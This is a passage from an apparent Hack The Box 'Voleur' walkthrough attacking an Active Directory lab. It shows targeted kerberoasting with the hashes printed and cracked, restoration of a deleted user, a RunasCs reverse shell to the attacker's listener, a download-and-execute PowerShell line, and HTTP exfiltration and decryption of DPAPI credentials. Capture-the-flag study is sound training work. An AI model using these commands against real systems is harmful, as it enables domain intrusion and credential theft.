distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE
```


### Attack path

- `svc_ldap`
	- Can perform **targeted kerberoast** attack on `svc_winrm`
	- Can restore the user `Todd Wolfe` under `SECOND-LINE SUPPORT TECHNICIANS@VOLEUR.HTB` **OU**
	- Can perform **targeted kerberoast** attack first, then force change `LACEY.MILLER`'s password if failed  (**ADCS** is not enabled, so we can't create shadow credentials)

![](/assets/obsidian/ebc97d96dcbb07b229c3ad072888acd9.png)

- `SECOND-LINE SUPPORT TECHNICIANS@VOLEUR.HTB` **OU** contains `LACEY.MILLER`

![](/assets/obsidian/07c46fb757a40d14973bd0f02d6111b3.png)

- `svc_iis`

![](/assets/obsidian/409c11845c6f88def15793edc1b80c54.png)

### DACL Abuse - Targeted kerberoasting

**Targeted kerberoast** by setting and removing SPN on `lacey.miller` and `svc_winrm`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -o targetedroastables.txt -v --dc-host "$(pt get dc_fqdn)" -d "$(pt get domain)" -k --no-pass
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Writing hash to file for (lacey.miller)
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Writing hash to file for (svc_winrm)
[VERBOSE] SPN removed successfully for (svc_winrm)

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ cat targetedroastables.txt
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$1b6fcb61fe336dbdca9178ff33d3d154$2ed6c673a60d47ece66986778e577dc7231312cfc04183a452100fcca6a4fcf88cc40e0f375928e9b3706c1f3d90073ab4b094c62d340602e6551d6a90e79e6760de199326b8872861f6c56171471c31119522d4befe93b4e01240297fec3cc85ed1f0fd849f7e8d82745fef817ce744b9ab3e39ece23a65380232b63ddd2a819474ef173788dbb0020c04a6f638484ed621bdb6e886cb59d3fde593a860d0eed429a4d21d44eb9b82fa4b0910e1f21d76b0cc54f1a3d5d57900234043ef74abac6bfb4b36ea93c25eb0dc05631bf3bfdfe71a8893fac47c21d4843109ac4d87edc5b71787e224c73c7e1d2ea64eb27f5a719741be486367cc613292064549d26379629ac9fd788795a4786fe2ae44cb0a067397aed0ead9cc97562d102a8d488960d9992b9cbd5aac6ea6854dc7360ea1cbd63c2ad7699f2d8769c3a71ef5395ff62036338f3965f74d7d80b10b536256674410ed80d1f89db197c1c2baed37a34812503bef98d8290d1f1b046665b8578e0cfab10ccb8a7837d78ec95946aa05516bc0505de74fe773bb46ea04452e2e5208234f47b9a63db40e1608d2bba466910dbd3f9287e05d36f348e2c54791cb6c1f7ba9b29c004c1eb60c9353800b937c706a7417e1af26c368f36145cf95a2fedb62a9c7f9102ab1d42694d5d1cf39648c0198d7999e8b36c2a7e5c5e8a601eac1f439e2718beacb4fb32b383ac63d21101ece73909459c959ae767aacbb29cd3cbf9f7ed4c15a4f62b4e037b2e1582bfe2812f9fe408517410188274ec4ede48abf1ce559de53d49e7c1f86265bd135500d0f20ef4d348f95eef9df037180b3bb5885fbf65552cf2bd79ddb40646b7e130125a3dc91825d0f4d528ccb86d1fa0bdcd9999f0c096fd9dc7823b24a9049be4d85eb0b9d830eff904c77958a835a8693036f8a78cf5d7df25ea3ea27579f55e5c2b02d324469d0a15c33d1cd052950f1441dc4af6f4c98a5432d0035d0b44707ce517685027d2a983d6e26100840932d6419b14a5961d34c845d4bf712a34a98c4ecb0a2be725f0d6ba483fb8ad17cde54de6c9c35f734ee7b611644e87a368b5115f5537644ad81869a58c0378250589b0f598c41f785e0b3abadd47f6ba6b9427bd01a12596673353abb4eda0b9a338c639701440de826b82ecd745a0b533866f6f24acf73f405b61489768f07e0d005ffc9ca640b15944c7419cca93636eb83c4f27d9a96ede02c5fe762f1e10d41ad3d57f4065f26491d2220d67fe3cc43cd7fd4451e05b830d57df345984df55f4da627ebb5530b0eb339396a78e17c84fd64c1ec3b5c02cc0bbd1e334824922b51e79be539c25b27a4e2ec0bc5ef3d8aacf2bf71590921fb7fdc49c753645e6bce714ff4fda4b9d9fa919b048c931176423b3643e5a38ff7b6051c5d1a3ae068d287073698e1e24c5ccef56ea8f8c7025252e1337fcddf90204694f0a8f967
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$627560a8354e44585fff6465103c1733$abc53616b21ea5c4da46d2c4cfc0de123e3c8bcea38ad17663b541d8c32fae24a3cbd9f6ab986752423c200a964b13013d8feeff69f22c7b68fcd74119e868823bfbed33a2161d3f78c3eb73c632a82d2c1926c4a1662b69c2146ea26b062a2a150481b47a319b57bf39f27004cc7dac0365911f786b83d6a182ada9a225ceeb48bf6ad951e27829c1a5903b3318f736cda48931590d47536cd75e0f99795b6fa602c9a3696dc1a135200df5bf306297276e5e88eb440bd2d4840c4cf041f7acd6278dc0cbba3b473e8ee2ef1beb619ee7614a78284dfcbb861b863e428b9628e77ada84619f4b1d705c8c96f3e7dae461aa73cee0efecc4ea8b0cd8e2c67499d52e67c3d55401fe271757ded49d63e1b41a901f50cae3e7c2b188ac0fb2dc2f7d7139113053614ed4ccbe6c697515d62fd2fce93cf1325fead628b58d9b8f41d26be6d3f76502b30bb89dee38f7937d5a2bd9f1451bc11cbba643cadd36a4a16f1b339476e98379fec666d3a27fe7389946513295e345c3feeebb75f60cfd7aeb8c8a87b4c448cd21c8073183c2974629c1ca0db4aad7b874c2cf4219d0e0d18ae968de61e4dbcac23d1333d125aae5edd26e414c2f965b39bf202318d726fdf61e0ca50236a1d42ca6be8ea4f1244808c6a701f9cdbbbbb5cc091b4a3fcb28eec9d308e6cd0f703801312afee577dc2ea646bef4221868ccaf4fabcda9c827e98e94272ba088fe980c91d4ad03381121e1a1b840a0523a2a5a8b8df5e0b511f9f372bba514de4a190539a2f23bd44ecc5f944f616714e6a5dea8253b05f35288f3034ed79814e40874947e0f1cf73a8502ea12b1d053bdc13306fa830326270ba94460f7fcd86783f1a8ff7c0aa842db54f27b0f555cccb1863c057a857b90f18c6d8ad7c3139b416fb1aac2287f0a5b7fd7d0e2046b270109cf3336421029d7809e8c66b0be044d27ccad1c36dd8272b4aa429cbce613af75ffa3cee2d1402f186dc12a56306871aaf886d0e4a6d8549de14eb07c2c33d9919302102e1d7383ec459b5455d829531989f2fbc277affdbd740e6deb27c58ab9a16250fa9d12cd3e59e39d69305c8ed759ec72a1e0dfeb292e053cc3431a4ec9837c03051de94d2e0e6212c58fae8741318c35827e6f85996a172bf2fd3fabb721f4d69cce59173e704bbc301c590f8b311348083cf2a35cd94c2b12beb8f2a537994316978aa218d5028b89e8889593fe7cf3b0a8a62f85c5df469e144ddd579567780eb0fbbf3c58bb51867f07b18ed369bde50d4197609e1ff0dbab7c4bf65f9b14f0f8746ae491935683d469dbda9df563488237d29010b699b948ff517b0dc11f236e5044b1f8924ccde623781e553054f2d0380dfaa1b8e97c78c03997991d65703fb049de62dff15ed202637f918038990ed8b40b77c87df8a359c5034e91e95c08e94e232620cb7ec4beb842e3dfbca972035f498a
```

Crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ hashcat targetedroastables.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting in autodetect mode
[...]

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ hashcat targetedroastables.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$627560a8354e44585fff6465103c1733$abc53616b21ea5c4da46d2c4cfc0de123e3c8bcea38ad17663b541d8c32fae24a3cbd9f6ab986752423c200a964b13013d8feeff69f22c7b68fcd74119e868823bfbed33a2161d3f78c3eb73c632a82d2c1926c4a1662b69c2146ea26b062a2a150481b47a319b57bf39f27004cc7dac0365911f786b83d6a182ada9a225ceeb48bf6ad951e27829c1a5903b3318f736cda48931590d47536cd75e0f99795b6fa602c9a3696dc1a135200df5bf306297276e5e88eb440bd2d4840c4cf041f7acd6278dc0cbba3b473e8ee2ef1beb619ee7614a78284dfcbb861b863e428b9628e77ada84619f4b1d705c8c96f3e7dae461aa73cee0efecc4ea8b0cd8e2c67499d52e67c3d55401fe271757ded49d63e1b41a901f50cae3e7c2b188ac0fb2dc2f7d7139113053614ed4ccbe6c697515d62fd2fce93cf1325fead628b58d9b8f41d26be6d3f76502b30bb89dee38f7937d5a2bd9f1451bc11cbba643cadd36a4a16f1b339476e98379fec666d3a27fe7389946513295e345c3feeebb75f60cfd7aeb8c8a87b4c448cd21c8073183c2974629c1ca0db4aad7b874c2cf4219d0e0d18ae968de61e4dbcac23d1333d125aae5edd26e414c2f965b39bf202318d726fdf61e0ca50236a1d42ca6be8ea4f1244808c6a701f9cdbbbbb5cc091b4a3fcb28eec9d308e6cd0f703801312afee577dc2ea646bef4221868ccaf4fabcda9c827e98e94272ba088fe980c91d4ad03381121e1a1b840a0523a2a5a8b8df5e0b511f9f372bba514de4a190539a2f23bd44ecc5f944f616714e6a5dea8253b05f35288f3034ed79814e40874947e0f1cf73a8502ea12b1d053bdc13306fa830326270ba94460f7fcd86783f1a8ff7c0aa842db54f27b0f555cccb1863c057a857b90f18c6d8ad7c3139b416fb1aac2287f0a5b7fd7d0e2046b270109cf3336421029d7809e8c66b0be044d27ccad1c36dd8272b4aa429cbce613af75ffa3cee2d1402f186dc12a56306871aaf886d0e4a6d8549de14eb07c2c33d9919302102e1d7383ec459b5455d829531989f2fbc277affdbd740e6deb27c58ab9a16250fa9d12cd3e59e39d69305c8ed759ec72a1e0dfeb292e053cc3431a4ec9837c03051de94d2e0e6212c58fae8741318c35827e6f85996a172bf2fd3fabb721f4d69cce59173e704bbc301c590f8b311348083cf2a35cd94c2b12beb8f2a537994316978aa218d5028b89e8889593fe7cf3b0a8a62f85c5df469e144ddd579567780eb0fbbf3c58bb51867f07b18ed369bde50d4197609e1ff0dbab7c4bf65f9b14f0f8746ae491935683d469dbda9df563488237d29010b699b948ff517b0dc11f236e5044b1f8924ccde623781e553054f2d0380dfaa1b8e97c78c03997991d65703fb049de62dff15ed202637f918038990ed8b40b77c87df8a359c5034e91e95c08e94e232620cb7ec4beb842e3dfbca972035f498a:AFireInsidedeOzarctica980219afi
```


### 5985 - Winrm

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ creds-set 'svc_winrm' 'AFireInsidedeOzarctica980219afi'
[+] Password set for user svc_winrm

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250626.63631.6b8f623 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_winrm.ccache
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami
voleur\svc_winrm
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cat ..\Desktop\user.txt
925e40e4ff40d40a6c9515c055c06776
```


# Root Flag
---

## Shell as todd.wolfe


### Enumeration - Interesting folder

```bash
PS C:\Windows\system32> (ls -Force \) 2>$null | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap

Mode   Owner                       LastWriteTime        Length    FullName
----   -----                       -------------        ------    --------
d-----                             5/8/2021 1:20:24 AM            C:\PerfLogs
d--hsl NT AUTHORITY\SYSTEM         1/28/2025 8:34:36 PM           C:\Documents and Settings
d--hs- BUILTIN\Administrators      1/28/2025 8:34:37 PM           C:\Recovery
d----- BUILTIN\Administrators      1/29/2025 1:10:01 AM           C:\Finance
d----- BUILTIN\Administrators      1/29/2025 1:10:01 AM           C:\HR
d----- BUILTIN\Administrators      1/29/2025 1:10:01 AM           C:\IT
d-r--- NT AUTHORITY\SYSTEM         1/30/2025 3:38:57 AM           C:\Users
d--hs- NT AUTHORITY\SYSTEM         1/30/2025 3:39:05 AM           C:\$Recycle.Bin
d--hs-                             1/30/2025 3:49:15 AM           C:\System Volume Information
d----- NT SERVICE\TrustedInstaller 1/30/2025 5:53:33 AM           C:\Program Files (x86)
d-r--- NT SERVICE\TrustedInstaller 1/30/2025 6:20:46 AM           C:\Program Files
d----- NT AUTHORITY\SYSTEM         5/29/2025 3:07:56 PM           C:\inetpub
d----- NT SERVICE\TrustedInstaller 6/5/2025 12:53:29 PM           C:\Windows
d--h-- BUILTIN\Administrators      6/30/2025 2:08:33 PM           C:\$WinREAgent
-a-hs-                             7/8/2025 4:19:24 AM  738197504 C:\pagefile.sys
-a-hs-                             7/8/2025 4:19:24 AM  12288     C:\DumpStack.log.tmp
d--h-- NT AUTHORITY\SYSTEM         7/9/2025 6:20:28 AM            C:\ProgramData
```

We could potentially view `C:\IT\Second-Line Support` from SMB share as `LACEY.MILLER`

```bash
PS C:\Windows\system32> ls \IT -Force -r | select Mode,@{N='Owner'; E={$_.GetAccessControl().Owner}},LastWriteTime,Length,FullName | sort LastWriteTime | ft -wrap
ls : Access to the path 'C:\IT\First-Line Support' is denied.
At line:1 char:1
+ ls \IT -Force -r | select Mode,@{N='Owner'; E={$_.GetAccessControl(). ...
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\IT\First-Line Support:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

ls : Access to the path 'C:\IT\Second-Line Support' is denied.
At line:1 char:1
+ ls \IT -Force -r | select Mode,@{N='Owner'; E={$_.GetAccessControl(). ...
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\IT\Second-Line Support:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

ls : Access to the path 'C:\IT\Third-Line Support' is denied.
At line:1 char:1
+ ls \IT -Force -r | select Mode,@{N='Owner'; E={$_.GetAccessControl(). ...
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\IT\Third-Line Support:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand


Mode   Owner LastWriteTime        Length FullName
----   ----- -------------        ------ --------
d-----       1/29/2025 1:40:17 AM        C:\IT\First-Line Support
d-----       1/29/2025 7:13:03 AM        C:\IT\Second-Line Support
d-----       1/30/2025 8:11:29 AM        C:\IT\Third-Line Support
```


### AD recycle bin - Restore user

The removed account `Todd Wolfe` was in `SECOND-LINE SUPPORT TECHNICIANS@VOLEUR.HTB` **OU**, we might be able to view the folder `C:\IT\Second-Line Support` with its permission

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(&(|(isDeleted=TRUE)(isRecycled=TRUE))(&(!(objectClass=dnsNode))(!(objectClass=dnsZone))))' --attr 'whenChanged,objectClass,lastKnownParent,distinguishedName,objectSid'

distinguishedName: CN=Deleted Objects,DC=voleur,DC=htb
objectClass: top; container
whenChanged: 2025-01-29 12:44:42+00:00

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
lastKnownParent: OU=Second-Line Support Technicians,DC=voleur,DC=htb
objectClass: top; person; organizationalPerson; user
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110
whenChanged: 2025-07-24 17:38:19+00:00

distinguishedName: CN=First-Line Support Techs\0ADEL:249f4ce2-edd7-46be-8af9-98bcfcb99dbe,CN=Deleted Objects,DC=voleur,DC=htb
lastKnownParent: DC=voleur,DC=htb
objectClass: top; group
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1111
whenChanged: 2025-01-29 09:14:49+00:00
```

Since `svc_ldap` has **GenericWrite** ACE on `Second-Line Support Technicians` **OU**, we can restore the user `Todd Wolfe` back to the **OU**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="svc_ldap.ccache" set restore todd.wolfe
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

- `todd.wolfe`'s password from `access_Review.xlsx` is still valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ nxc ldap $(pt get rhost) -k -u 'todd.wolfe' -p 'NightT1meP1dg3on14'
LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ creds-set 'todd.wolfe' 'NightT1meP1dg3on14'
[+] Password set for user todd.wolfe

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in todd.wolfe.ccache
```


### Runascs

- `todd.wolfe` is in `Remote Management Users` and `Second-Line Technicians` group, which should make it able to access `C:\IT\Second-Line Support` folder on target machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get membership "$(pt get user)"

distinguishedName: CN=Users,CN=Builtin,DC=voleur,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-513
sAMAccountName: Domain Users

distinguishedName: CN=Second-Line Technicians,DC=voleur,DC=htb
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1113
sAMAccountName: Second-Line Technicians
```

> `todd.wolfe` couldn't **winrm** to target machine likely due to partial ad recycle bin recovery
> 
> ```bash
> ┌──(bravosec㉿fsociety)-[~/htb/Voleur]
> └─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)
> 
> Evil-WinRM shell v3.7
> 
> Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
> 
> Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
> 
> Info: Establishing connection to remote endpoint
> 
> Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
> Success
> 
> 
> Error: Exiting with code 1
> ```
{: .prompt-danger }

We can use [RunasCs](https://github.com/antonioCoco/RunasCs) to return a reverse shell instead

```bash
rlwrap -cAr nc -lvnp 1111
```

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.9:80/Invoke-RunasCs.ps1')
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-RunasCs -LogonType 8 -Username "todd.wolfe" -Password "NightT1meP1dg3on14" -Command powershell.exe -Remote 10.10.14.9:1111 -Domain "voleur.htb"

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-ddc4ac$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5608 created in background.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.252.147] 52013
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\todd.wolfe
```


## Auth as jeremy.combs


### User profile folder (Second-Line Support)

`C:\IT\Second-Line Support` contains a backup of `todd.wolfe`'s user profile folder

```bash
PS C:\Windows\system32> ls -fo 'C:\IT\Second-Line Support\'
ls -fo 'C:\IT\Second-Line Support\'


    Directory: C:\IT\Second-Line Support


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   7:13 AM                Archived Users
```

```bash
PS C:\Windows\system32> ls -fo 'C:\IT\Second-Line Support\Archived Users\todd.wolfe\'
ls -fo 'C:\IT\Second-Line Support\Archived Users\todd.wolfe\'


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         1/29/2025   7:13 AM                3D Objects
d--h--         1/29/2025   7:13 AM                AppData
d-r---         1/29/2025   7:13 AM                Contacts
d-r---         1/30/2025   6:28 AM                Desktop
d-r---         1/29/2025   7:13 AM                Documents
d-r---         1/29/2025   7:13 AM                Downloads
d-r---         1/29/2025   7:13 AM                Favorites
d-r---         1/29/2025   7:13 AM                Links
d-r---         1/29/2025   7:13 AM                Music
d-r---         1/29/2025   7:13 AM                Pictures
d-r---         1/29/2025   7:13 AM                Saved Games
d-r---         1/29/2025   7:13 AM                Searches
d-r---         1/29/2025   7:13 AM                Videos
-a-hs-         1/29/2025   7:13 AM          65536 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-a-hs-         1/29/2025   4:53 AM         524288 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer000000000
                                                  00000000001.regtrans-ms
-a-hs-         1/29/2025   4:53 AM         524288 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer000000000
                                                  00000000002.regtrans-ms
-a-hs-         1/29/2025   4:53 AM             20 ntuser.ini
```

At this stage, we can do 3 things first:

1. Harvest Powershell history
2. Dump DPAPI secrets (Windows Credential Manager, Browser saved data...) (Since we have the user password, it will be easy to decrypt masterkeys locally)
3. Forensics (Activities such as Shellbags, file/folder opening, programs ran...)

The powershell history file contains some hints from the box creator who was browsing **Windows Credential Manager**'s DPAPI-protected data

```bash
PS C:\Windows\system32> cat 'C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
cat 'C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
cd appdata
ls
cd local
ls
cd .\Microsoft\
ls
cd .\Credentials\
ls
cd ../../../
cd roaming
ls
cd .\Microsoft\
ls
cd .\Protect\
lw
ls
cd .\S-1-5-21-3927696377-1337352550-2781715495-1110\
ls
ls -h
ipconfig
ls -h
```


### DPAPI - Decrypt stored credentials

Dump DPAPI master keys and protected data

```powershell
# Master keys
mkdir -fo \programdata\dp_key; $base_dir='C:\IT\Second-Line Support\Archived Users\todd.wolfe'; cp -r -fo "$base_dir\AppData\Roaming\Microsoft\Protect" \programdata\dp_key\

# DPAPI protected vaults and credentials
mkdir -fo \programdata\dp_data; $base_dir='C:\IT\Second-Line Support\Archived Users\todd.wolfe'; "$base_dir\AppData\Roaming\Microsoft\Credentials\", "$base_dir\AppData\Local\Microsoft\Credentials\", "$base_dir\AppData\Local\Microsoft\Vault\" | % { cp -fo -r $_ \programdata\dp_data\ }

# Zip
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.9:80/lol/windows/7za.exe', '\programdata\7za.exe'); \programdata\7za.exe a C:\programdata\dp.zip C:\ProgramData\dp_key\* C:\ProgramData\dp_data\*
```

![](/assets/obsidian/c481b42fd4370137679e15abc26f673b.png)

Exfiltrate the zip file via HTTP

```bash
PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; simplehttpserver -listen "0.0.0.0:$PORT" -upload
```

```bash
PS C:\Windows\system32> curl -UseBasicParsing -Method PUT http://10.10.14.9/dp.zip -InFile "\programdata\dp.zip"


StatusCode        : 201
StatusDescription : Created
Content           : {}
RawContent        : HTTP/1.1 201 Created
                    Content-Length: 0
                    Date: Wed, 09 Jul 2025 20:24:24 GMT


Headers           : {[Content-Length, 0], [Date, Wed, 09 Jul 2025 20:24:24 GMT]}
RawContentLength  : 0
```

![](/assets/obsidian/6235f5b7b04c34db10d735b8d9e019fa.png)

Extract files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ mv ~/www/dp.zip ./loot

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ 7z x loot/dp.zip -o'./loot'
[...]

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ 7z l loot/dp.zip
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-07-10 04:19:27 D....            0            0  Credentials
2025-01-29 20:55:19 ....A          398          398  Credentials/772275FAD58525253490A9B0039791D3
2025-01-29 20:53:10 ....A        11068        11068  Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
2025-07-10 04:19:26 D....            0            0  Protect
2025-01-29 20:53:09 ..HSA           24           24  Protect/CREDHIST
2025-07-10 04:19:26 D....            0            0  Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
2025-01-29 20:53:09 ....A          740          723  Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
2025-01-29 20:53:09 ..HSA          900          877  Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/BK-VOLEUR
2025-01-29 20:53:09 ..HSA           24           24  Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/Preferred
2025-01-29 20:53:09 ..HSA           76           76  Protect/SYNCHIST
2025-07-10 04:19:27 D....            0            0  Vault
2025-07-10 04:19:27 D....            0            0  Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28
2025-01-29 20:54:04 ....A          352          344  Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/Policy.vpol
------------------- ----- ------------ ------------  ------------------------
2025-07-10 04:19:27              13582        13534  8 files, 5 folders
```

Decrypt masterkeys

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ PASS='NightT1meP1dg3on14'; MASTERKEYS="$(find loot/Protect/ -type f | grep -E '[[:xdigit:]]{8}(-[[:xdigit:]]{4}){3}-[[:xdigit:]]{12}')"; SID="$(echo $MASTERKEYS | head -n1 | rev | cut -d'/' -f 2 | rev)"; echo "$MASTERKEYS" | while read -r f; do r=$(dpapi.py masterkey -sid "$SID" -file "$f" -password "$PASS"); echo "$r" | grep -q 'Decrypted key' && echo "$r"; done
Impacket v0.13.0.dev0+20250708.155831.171a324 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Decrypt dpapi-protected data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ KEY='0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'

┌──(bravosec㉿fsociety)-[~/htb/Voleur]
└─$ FILES="$(find loot/Credentials -type f)"; echo "$FILES" | while read -r f; do dpapi.py credential -key "$KEY" -file "$f" | grep -a '^\[' -A10; done
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[CREDENTIAL]
LastWritten : 2025-01-29 12:53:10+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
